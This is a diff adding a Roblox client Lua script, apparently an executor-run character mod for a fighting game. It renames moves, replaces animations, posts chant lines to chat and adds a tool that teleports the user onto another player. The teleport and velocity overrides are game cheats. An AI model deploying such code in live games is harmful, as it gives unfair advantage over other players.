@@ -1,0 +1,1578 @@
+--Move & Ultimate Names
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local character = player.Character or player.CharacterAdded:Wait()
+local mouse = player:GetMouse() 
+local userInputService = game:GetService("UserInputService")
+
+local player = game.Players.LocalPlayer
+local playerGui = player.PlayerGui
+local hotbar = playerGui:FindFirstChild("Hotbar")
+local backpack = hotbar:FindFirstChild("Backpack")
+local hotbarFrame = backpack:FindFirstChild("Hotbar")
+local baseButton = hotbarFrame:FindFirstChild("1").Base
+local ToolName = baseButton.ToolName
+ToolName.Text = "Reversal Red"
+
+
+local player = game.Players.LocalPlayer
+
+local playerGui = player.PlayerGui
+
+local hotbar = playerGui:FindFirstChild("Hotbar")
+
+local backpack = hotbar:FindFirstChild("Backpack")
+
+local hotbarFrame = backpack:FindFirstChild("Hotbar")local Players = game:GetService("Players")
+
+local baseButton = hotbarFrame:FindFirstChild("2").Base
+
+local ToolName = baseButton.ToolName
+
+
+ToolName.Text = "Beatdown"
+
+
+local player = game.Players.LocalPlayer
+
+local playerGui = player.PlayerGui
+
+local hotbar = playerGui:FindFirstChild("Hotbar")
+
+local backpack = hotbar:FindFirstChild("Backpack")
+
+local hotbarFrame = backpack:FindFirstChild("Hotbar")
+
+local baseButton = hotbarFrame:FindFirstChild("3").Base
+
+local ToolName = baseButton.ToolName
+
+
+ToolName.Text = "Rushing Kick"
+
+
+local player = game.Players.LocalPlayer
+
+local playerGui = player.PlayerGui
+
+local hotbar = playerGui:FindFirstChild("Hotbar")
+
+local backpack = hotbar:FindFirstChild("Backpack")
+
+local hotbarFrame = backpack:FindFirstChild("Hotbar")
+
+local baseButton = hotbarFrame:FindFirstChild("4").Base
+
+local ToolName = baseButton.ToolName
+
+
+ToolName.Text = "Skyward Kick"
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+local function findGuiAndSetText()
+    local screenGui = playerGui:FindFirstChild("ScreenGui")
+    
+    if screenGui then
+        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")
+        
+        if magicHealthFrame then
+            local healthBar = magicHealthFrame:FindFirstChild("Health")
+            local bar = healthBar and healthBar:FindFirstChild("Bar")
+            local imageBar = bar and bar:FindFirstChild("Bar")
+            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")
+
+            if imageBar and textLabel then
+                -- Function to update text and color based on health
+                local function updateTextAndColorBasedOnHealth()
+                    RunService.Heartbeat:Connect(function()
+                        if humanoid and humanoid.Parent then
+                            local health = humanoid.Health
+                            local maxHealth = humanoid.MaxHealth
+                            local healthPercentage = (health / maxHealth) * 100
+
+                            if healthPercentage < 30 then
+                                imageBar.ImageColor3 = Color3.fromRGB(255, 255, 0) -- Yellow
+                                textLabel.Text = "The Honored One"
+                            else
+                                imageBar.ImageColor3 = Color3.fromRGB(0, 0, 255) -- Blue
+                                textLabel.Text = "The Strongest Sorcerer"
+                            end
+                        end
+                    end)
+                end
+
+                updateTextAndColorBasedOnHealth() -- Start the health check loop
+            end
+        end
+    end
+end
+
+playerGui.DescendantAdded:Connect(findGuiAndSetText)
+findGuiAndSetText()
+local Players = game:GetService("Players")
+
+local function changeItemNames(player)
+    local inventory = player:FindFirstChild("Backpack")
+    if inventory then
+        for _, item in pairs(inventory:GetChildren()) do
+            if item:IsA("Tool") then
+                if item.Name == "Death Counter" then
+                    item.Name = "Reversal Red Counter"
+                elseif item.Name == "Table Flip" then
+                    item.Name = "Hollow Purple"
+                elseif item.Name == "Serious Punch" then
+                    item.Name = "Reversal Red"
+                elseif item.Name == "Omni Directional Punch" then
+                    item.Name = "Omni Directional Punch"
+                end
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        changeItemNames(player)
+    end)
+end)
+
+
+--[[Animations]]
+
+--[[Move 1]]
+
+local animationId = 10468665991
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://13073745835"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0.1)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(0.9)
+
+
+    end
+
+end
+
+--[[END OF MOVE 1 ANIM]]
+
+--[[Move 2]]
+
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 10466974800
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://13560306510"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(1)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(3)
+
+
+    end
+
+end
+
+--[[END OF MOVE 2 ANIM]]
+
+--[[Move 3]]
+
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 10471336737
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://17838619895"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0.3
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(1)
+
+
+delay(1.8, function()
+
+    Anim:Stop()
+
+end)
+
+
+    end
+
+end
+
+--[[END OF MOVE 3 ANIM]]
+
+--[[Move 4]]
+
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 12510170988
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://18179181663"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(1)
+
+
+    end
+
+end
+
+--[[END OF MOVE 4 ANIM]]
+
+--[[Wall combo]]
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+local animationId = 15955393872
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://18903642853"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0.05
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(2)
+
+
+    end
+
+end
+
+--[[END OF WALL COMBO ANIM]]
+
+--[[Ult Activation]]
+local animationId = 12447707844
+
+local function onAnimationPlayed(animationTrack)
+    -- Check if the played animation matches the specified animation ID
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+        -- Stop all currently playing animations
+        local TweenService = game:GetService("TweenService")
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local function createBB(text, offsetX)
+    local billboardGui = Instance.new("BillboardGui")
+    billboardGui.Parent = rootPart
+    billboardGui.Size = UDim2.new(0, 100, 0, 250)
+    billboardGui.StudsOffset = Vector3.new(offsetX, -1, 0) -- Set initial Y offset to -1
+    billboardGui.AlwaysOnTop = true
+    billboardGui.LightInfluence = 0
+    billboardGui.MaxDistance = 100
+
+    local frame = Instance.new("Frame")
+    frame.Parent = billboardGui
+    frame.Size = UDim2.new(0, 80, 0, 180)
+    frame.Position = UDim2.new(0.5, -40, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    frame.BorderSizePixel = 4
+    frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = frame
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.Text = text
+    textLabel.Font = Enum.Font.SourceSans
+    textLabel.TextSize = 28
+    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    textLabel.ZIndex = 2
+
+    return billboardGui
+end
+
+local rightBB = createBB("LET'S\nGET", 5)
+local leftBB = createBB("...A\nLITTLE\nCRAZY", -2.5)
+
+local function aB(billboardGui)
+    billboardGui.Enabled = true
+    
+    -- Move the BillboardGui upward during the fade-in
+    local tween = TweenService:Create(billboardGui, TweenInfo.new(1), {StudsOffset = Vector3.new(billboardGui.StudsOffset.X, -1, 0)}) -- Animate to Y=2
+    tween:Play()
+
+    for i = 0, 1, 0.1 do
+        billboardGui:SetAttribute("Transparency", i)
+        billboardGui.Frame.BackgroundTransparency = 1 - i
+        billboardGui.Frame.TextLabel.TextTransparency = 1 - i
+        task.wait(0.05)
+    end
+end
+
+local function dB(billboardGui)
+    -- Ensure the BillboardGui is still enabled when fading out
+    for i = 1, 0, -0.1 do
+        billboardGui:SetAttribute("Transparency", i)
+        billboardGui.Frame.BackgroundTransparency = 1 - i
+        billboardGui.Frame.TextLabel.TextTransparency = 1 - i
+        task.wait(0.05)
+    end
+    
+    billboardGui.Enabled = false
+    billboardGui:Destroy()
+end
+
+-- Call the fade-in functions for both BillboardGuis
+aB(rightBB)
+task.wait(0.3)
+aB(leftBB)
+task.wait(0.3)
+
+-- Fade out both BillboardGuis
+dB(rightBB)
+dB(leftBB)
+    end
+end
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+--[[END OF ULT ACTIVATION ANIM]]
+
+--[[Dash]]
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 10479335397
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://17838006839"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(1.3)
+
+
+delay(1.8, function()
+
+    Anim:Stop()
+
+end)
+
+
+    end
+
+end
+
+--[[END OF DASH ANIM]]
+
+--[[Uppercut]]
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 10503381238
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://18179181663"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 1.3
+
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(2)
+
+
+    end
+
+end
+
+--[[END OF UPPERCUT ANIM]]
+
+--[[Downslam]]
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local animationId = 10470104242
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local function onAnimationPlayed(animationTrack)
+
+    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
+
+local p = game.Players.LocalPlayer
+
+local Humanoid = p.Character:WaitForChild("Humanoid")
+
+
+for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
+
+    animTrack:Stop()
+
+end
+
+
+local AnimAnim = Instance.new("Animation")
+
+AnimAnim.AnimationId = "rbxassetid://16139108718"
+
+local Anim = Humanoid:LoadAnimation(AnimAnim)
+
+
+local startTime = 0
+
+
+wait(0.2)
+
+Anim:Play()
+
+Anim:AdjustSpeed(0)
+
+Anim.TimePosition = startTime
+
+Anim:AdjustSpeed(6)
+
+
+    end
+
+end
+
+--[[END OF DOWNSLAM ANIM]]
+
+--[[Punch anims]]
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoid = character:WaitForChild("Humanoid")
+
+
+local animationIdsToStop = {
+
+    [17859015788] = true, --punch idk
+
+    [10469493270] = true, --punch1
+
+    [10469630950] = true, --punch2
+
+    [10469639222] = true, --punch3
+
+    [10469643643] = true, --punch4
+
+}
+
+
+local replacementAnimations = {
+
+    ["10469493270"] = "rbxassetid://17889458563", --punch1
+
+    ["10469630950"] = "rbxassetid://17889461810", --punch2
+
+    ["10469639222"] = "rbxassetid://17889471098", --punch3
+
+    ["10469643643"] = "rbxassetid://17889290569", --punch4
+
+    ["17859015788"] = "rbxassetid://12684185971", --punch idk
+
+    ["11365563255"] = "rbxassetid://14516273501" --punch idk
+
+}
+
+
+local queue = {}
+
+local isAnimating = false
+
+
+local function playReplacementAnimation(animationId)
+
+    if isAnimating then
+
+        table.insert(queue, animationId)
+
+        return
+
+    end
+
+   
+
+    isAnimating = true
+
+    local replacementAnimationId = replacementAnimations[tostring(animationId)]
+
+    if replacementAnimationId then
+
+        local AnimAnim = Instance.new("Animation")
+
+        AnimAnim.AnimationId = replacementAnimationId
+
+        local Anim = humanoid:LoadAnimation(AnimAnim)
+
+        Anim:Play()
+
+       
+
+        Anim.Stopped:Connect(function()
+
+            isAnimating = false
+
+            if #queue > 0 then
+
+                local nextAnimationId = table.remove(queue, 1)
+
+                playReplacementAnimation(nextAnimationId)
+
+            end
+
+        end)
+
+    else
+
+        isAnimating = false
+
+    end
+
+end
+
+
+local function stopSpecificAnimations()
+
+    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+
+        local animationId = tonumber(track.Animation.AnimationId:match("%d+"))
+
+        if animationIdsToStop[animationId] then
+
+            track:Stop()
+
+        end
+
+    end
+
+end
+
+
+local function onAnimationPlayed(animationTrack)
+
+    local animationId = tonumber(animationTrack.Animation.AnimationId:match("%d+"))
+
+    if animationIdsToStop[animationId] then
+
+        stopSpecificAnimations()
+
+        animationTrack:Stop()
+
+       
+
+        local replacementAnimationId = replacementAnimations[tostring(animationId)]
+
+        if replacementAnimationId then
+
+            playReplacementAnimation(animationId)
+
+        end
+
+    end
+
+end
+
+
+humanoid.AnimationPlayed:Connect(onAnimationPlayed)
+
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+
+local function onBodyVelocityAdded(bodyVelocity)
+
+    if bodyVelocity:IsA("BodyVelocity") then
+
+        bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z)
+
+    end
+
+end
+
+
+character.DescendantAdded:Connect(onBodyVelocityAdded)
+
+
+for _, descendant in pairs(character:GetDescendants()) do
+
+    onBodyVelocityAdded(descendant)
+
+end
+
+
+player.CharacterAdded:Connect(function(newCharacter)
+
+    character = newCharacter
+
+    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+    character.DescendantAdded:Connect(onBodyVelocityAdded)
+
+   
+
+    for _, descendant in pairs(character:GetDescendants()) do
+
+        onBodyVelocityAdded(descendant)
+
+    end
+
+end) 
+
+-- [[TELEPORT TOOL]]
+-- Sound not playing in
+-- Create a Tool instance
+local teleportTool = Instance.new("Tool")
+teleportTool.Name = "Limitless Shift"
+teleportTool.RequiresHandle = false
+teleportTool.ToolTip = "Teleport to the player you are facing"
+teleportTool.Parent = game.Players.LocalPlayer:WaitForChild("Backpack")
+
+-- Create the handle for the tool
+local handle = Instance.new("Part")
+handle.Name = "Handle"
+handle.Size = Vector3.new(1, 1, 1)  -- Size of the handle
+handle.Transparency = 1  -- Invisible handle
+handle.CanCollide = false
+handle.Parent = nil
+
+-- Create the sound instance for teleportation
+local teleportSound = Instance.new("Sound")
+teleportSound.SoundId = "rbxassetid://6737581315"  -- Sound ID for teleportation
+teleportSound.Parent = teleportTool
+
+-- Create an animation instance for teleportation
+local teleportAnimation = Instance.new("Animation")
+teleportAnimation.AnimationId = "rbxassetid://13073745835"  -- Animation ID for teleportation
+
+-- Function to find the player in front of the camera
+local function getPlayerInCameraView()
+    local localPlayer = game.Players.LocalPlayer
+    local camera = workspace.CurrentCamera
+    local cameraPosition = camera.CFrame.Position
+    local cameraDirection = camera.CFrame.LookVector
+    
+    -- Loop through all other players
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local targetRootPart = player.Character.HumanoidRootPart
+            local distance = (targetRootPart.Position - cameraPosition).magnitude
+            local directionToTarget = (targetRootPart.Position - cameraPosition).unit  -- Direction to target player
+
+            -- Check if the target is within a reasonable angle in front of the camera
+            local angle = math.acos(cameraDirection:Dot(directionToTarget))
+
+            if angle < math.rad(15) then  -- Adjust the angle threshold if needed
+                return targetRootPart
+            end
+        end
+    end
+
+    return nil  -- No player found in view
+end
+
+-- Function to teleport the player to the player they are facing
+local function teleportToFacingPlayer()
+    local targetRootPart = getPlayerInCameraView()
+
+    if targetRootPart then
+        local localPlayer = game.Players.LocalPlayer
+        local localCharacter = localPlayer.Character
+        
+        -- Teleport the local player to the target player's HumanoidRootPart position
+        if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") then
+            localCharacter.HumanoidRootPart.CFrame = targetRootPart.CFrame
+        end
+    else
+        print("No player in view to teleport to!")
+    end
+end
+
+-- Function to handle camera zoom effect
+local function zoomCamera(fovTarget, duration)
+    local camera = workspace.CurrentCamera
+    local originalFOV = camera.FieldOfView
+
+    -- Tween the camera's Field of View to create zoom effect
+    local startTime = tick()
+    while tick() - startTime < duration do
+        local elapsed = tick() - startTime
+        local progress = elapsed / duration
+        camera.FieldOfView = originalFOV + (fovTarget - originalFOV) * progress
+        wait(0.03)  -- Adjust to control the speed of the zoom
+    end
+
+    camera.FieldOfView = fovTarget  -- Ensure it ends exactly at target FOV
+end
+
+-- Function to handle tool activation
+teleportTool.Activated:Connect(function()
+    -- Play the animation
+    local localPlayer = game.Players.LocalPlayer
+    local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
+    local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
+
+    local animationTrack  -- Variable to hold the animation track
+
+    if animator then
+        animationTrack = animator:LoadAnimation(teleportAnimation)
+        animationTrack:Play()  -- Play the animation
+    end
+
+    -- Play teleport sound
+    
+
+    -- Zoom the camera in
+    zoomCamera(10, 0.5)  -- Zoom to FOV of 30 over 0.5 seconds
+
+    -- Wait for the animation duration (adjust as necessary)
+    wait(0.3)  -- Duration for animation to play
+
+    -- Teleport to the player they are facing
+    teleportToFacingPlayer()
+    teleportSound:Play()
+
+    -- Zoom the camera out back to normal
+    zoomCamera(70, 0.5)  -- Zoom back to normal FOV of 70 over 0.5 seconds
+
+    -- Stop the animation after teleportation
+    if animationTrack and animationTrack.IsPlaying then
+        animationTrack:Stop()  -- Stop the animation if it's playing
+    end
+end)
+-- [[END OF TELEPORT TOOL]]
+-- [[ON DEATH]]
+-- Variables
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Animation IDs
+local StartupAnimationId = "15507137974" -- Startup Animation
+local MainAnimationId = "15507138928" -- Main Animation
+
+-- Variables to hold player character and humanoid
+local localPlayer = Players.LocalPlayer
+local playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local humanoid = playerCharacter:WaitForChild("Humanoid")
+
+-- Death position variable
+local deathPosition = nil
+local isDead = false -- Flag to prevent multiple death triggers
+
+-- Duration for the startup and main animations (in seconds)
+local startupDuration = 2 -- Duration for the startup animation
+local mainDuration = 3 -- Duration for the main animation
+
+-- Function to handle player death
+local function onDeath()
+    if isDead then return end -- Prevents multiple executions
+    isDead = true -- Set the flag to true
+
+    -- Store the death position
+    deathPosition = playerCharacter.PrimaryPart.Position
+
+    wait(5.3)
+
+    -- Teleport back to death position
+    playerCharacter:SetPrimaryPartCFrame(CFrame.new(deathPosition))
+
+    -- Play startup animation
+    local startupAnimation = Instance.new("Animation")
+    startupAnimation.AnimationId = "rbxassetid://" .. StartupAnimationId
+    local startupAnimTrack = humanoid:LoadAnimation(startupAnimation)
+    startupAnimTrack:Play()
+
+    -- Wait for the specified duration before stopping the startup animation
+    wait(startupDuration)
+    startupAnimTrack:Stop()
+
+ -- Play the main animation
+    local mainAnimation = Instance.new("Animation")
+    mainAnimation.AnimationId = "rbxassetid://" .. MainAnimationId
+    local mainAnimTrack = humanoid:LoadAnimation(mainAnimation)
+    mainAnimTrack:Play()
+
+    -- Send chat messages
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I finally grasped it on the verge of death,", "All")
+    wait(1)
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("REVERSE CURSED TECHNIQUE!", "All")
+    wait(1)
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("THE TRUE ESSENCE OF CURSED ENERGY!", "All")
+
+    -- Wait for the specified duration before stopping the main animation
+    wait(mainDuration)
+    mainAnimTrack:Stop()
+
+    isDead = false -- Reset the flag for the next death event
+end
+
+-- Connect the death event
+humanoid.Died:Connect(onDeath)
+
+-- In case the character respawns
+localPlayer.CharacterAdded:Connect(function(character)
+    playerCharacter = character
+    humanoid = character:WaitForChild("Humanoid")
+    isDead = false -- Reset the flag on character respawn
+end)
+-- [[END OF ONDEATH]]
+
+
+-- [[idk maybe chant]]
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+
+-- Local player
+local player = Players.LocalPlayer
+
+-- Function to check if player has an item in their inventory
+local function hasItem(itemName)
+    local backpack = player.Backpack
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    -- Check the backpack and character for the item
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item.Name == itemName then
+            return true
+        end
+    end
+    
+    for _, item in ipairs(character:GetChildren()) do
+        if item.Name == itemName then
+            return true
+        end
+    end
+
+    return false
+end
+
+-- Function to handle key press actions
+local function onKeyPress(input, gameProcessedEvent)
+    if gameProcessedEvent then return end -- Ignore if game is processing the event
+
+    -- Check for keybinds
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.Key2 then
+            -- Check for "Table Flip" item
+            if hasItem("Table Flip") then
+                -- Execute chant for Table Flip
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Take the amplified and reversal.", "All")
+                wait(1.5)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Then smash together those two different expressions of infinity.", "All")
+                wait(2)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("To create and push out imaginary mass.", "All")
+                wait(1)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Imaginary Technique:", "All")
+                wait(1.5)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Purple", "All")
+            end
+        elseif input.KeyCode == Enum.KeyCode.Key3 then
+            -- Check for "Serious Punch" item
+            if hasItem("Serious Punch") then
+                -- Execute chant for Serious Punch
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("The boundaries of fate are shattered, ", "All")
+                wait(1)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I command the forces of chaos, ", "All")
+                wait(2)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Awaken the red tide of power! ", "All")
+                wait(2)
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Cursed Technique Reversal: Red", "All")
+            end
+        end
+    end
+end
+
+-- Connect the key press event to the function
+UserInputService.InputBegan:Connect(onKeyPress)
+
+-- [[GOJO ASCEND]]
+
+-- [[END OF GOJO ASCEND]]
+local players = game:GetService("Players")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Script is still under development";
+    Text = "Expect bugs and lack of VFX";
+    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. players.LocalPlayer.UserId .. "&w=180&h=180 true";
+    Duration = 5
+})
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Developer";
+    Text = "Made by qqwrxxxx and PyroCoder";
+    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. players.LocalPlayer.UserId .. "&w=180&h=180 true";
+    Duration = 5
+})
+
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = screenGui 
+textLabel.Text = "MADE BY PyroCoder AND qqwrxxxx ON DISCORD"  
+textLabel.Size = UDim2.new(0, 300, 0, 100)  
+textLabel.Position = UDim2.new(0.5, -100, 0, 10) 
+textLabel.AnchorPoint = Vector2.new(0.5, 0)  
+textLabel.BackgroundTransparency = 1  
+textLabel.TextColor3 = Color3.new(1, 1, 1) 
+textLabel.TextStrokeTransparency = 0.9 
+textLabel.Font = Enum.Font.GothamBold
+textLabel.TextScaled = true 
+textLabel.TextTransparency = 0.9
+
+-- NO WAY SIX EYES
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local localPlayer = Players.LocalPlayer -- Get the local player reference
+local effectActive = false -- Track whether the effect is active
+
+local function createEffectForCharacter(character)
+    -- Wait for the HumanoidRootPart to be loaded
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+    if humanoidRootPart then
+        -- Check for and remove any existing attachment named "PowerUpAuraAttachment"
+        for _, child in ipairs(humanoidRootPart:GetChildren()) do
+            if child:IsA("Attachment") and child.Name == "PowerUpAuraAttachment" then
+                child:Destroy()
+            end
+        end
+
+        -- Clone and set up the new attachment
+        local attachment = ReplicatedStorage.Emotes.powerupaura.Attachment:Clone()
+        attachment.Name = "PowerUpAuraAttachment" -- Give it a unique name
+        attachment.Parent = humanoidRootPart
+        attachment.Position = Vector3.new(0, 0, 0) -- Center it on the HumanoidRootPart
+
+        -- Define color sequences
+        local colors = {
+            [1] = nil, -- No particle
+            [2] = ColorSequence.new{
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), -- Purple
